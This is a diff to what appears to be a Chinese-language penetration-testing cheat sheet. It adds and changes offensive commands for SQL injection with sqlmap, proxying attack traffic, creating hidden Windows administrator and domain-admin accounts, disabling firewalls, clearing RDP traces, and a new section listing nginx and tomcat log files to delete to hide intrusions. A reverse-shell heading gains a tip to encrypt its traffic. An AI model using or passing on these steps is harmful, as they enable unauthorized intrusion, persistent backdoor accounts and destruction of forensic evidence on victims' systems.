@@ -523,8 +523,9 @@ python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1
 proxychain   
 sockscap64    
 proxifier   
+ccproxy
+sockscap
 
-https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti   
 https://www.mediafire.com/folder/32rj1769a2w82/v4.7   
 
 
@@ -567,7 +568,7 @@ https://github.com/Dliv3/Venom
  ssh -T root@192.168.1.1 /usr/bin/bash -i
 ```
 
-## grep
+## grep搜索
 
 ```
 grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
@@ -652,6 +653,10 @@ python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3
 
 ```
 python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  --dbs
+```
+
+```
+python sqlmap.py -u "http://www.vuln.cn/post.php?id=*"  --dbms mysql  --dbs
 ```
 
 ```
@@ -839,7 +844,7 @@ useradd -p "$(openssl passwd 123456)" guest
 useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
 ```
 
-### windows
+### windows添加用户
 ```
 net user admin$ Afabab@20 /add
 net localgroup administrators admin$ /add
@@ -852,7 +857,7 @@ Net localgroup Administrators kent /add /domain 将域用户添加到域管理�
 Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组
 ```
 
-## 防火墙
+## Windows防火墙
 ```
 关闭防火墙
 
@@ -980,6 +985,20 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
 cd %userprofile%\documents\attrib Default.rdp -s -h
 del Default.rdp
 ```
+
+## 删web日志
+```
+/var/log/nginx/  
+​  
+access.log
+error.log  
+​  
+tomcat 位于 logs  
+catalina.*.log
+access_log.*.txt  
+
+```
+
 
 
 ## 开3389
@@ -1592,7 +1611,7 @@ cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
 ```
 
 
-## 反弹shell
+## 反弹shell(流量太敏感，尽量加密用)
 
 ## nc
 
